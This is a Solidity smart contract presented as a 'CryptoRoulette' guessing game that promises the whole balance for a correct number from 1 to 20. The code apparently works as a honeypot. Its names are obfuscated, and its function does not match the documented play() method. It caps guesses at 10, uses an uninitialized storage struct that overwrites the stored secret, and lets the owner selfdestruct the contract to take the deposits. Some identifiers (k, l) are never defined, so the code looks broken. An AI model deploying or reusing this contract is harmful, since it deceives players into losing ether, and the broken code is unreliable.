// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

// CryptoRoulette
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.

// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether

contract CryptoRoulette {

    uint256 private a;
    uint256 public c;
    uint256 public e = 0.1 ether;
    address public d;

    struct Game {
        address g;
        uint256 number;
    }
    Game[] public b;

    function CryptoRoulette() public {
        d = msg.sender;
        f();
    }

    function f() internal {
        // randomly set secretNumber with a value between 1 and 20
        a = uint8(k(l, block.blockhash(block.number-1))) % 20 + 1;
    }

    function h(uint256 number) payable public {
        require(msg.value >= e && number <= 10);
        Game i;
        i.g = msg.sender;
        i.number = number;
        b.push(i);

        if (number == a) {
            // win!
            msg.sender.transfer(this.balance);
        }

        f();
        c = l;
    }

    function j() public {
        if (msg.sender == d && l > c + 1 days) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}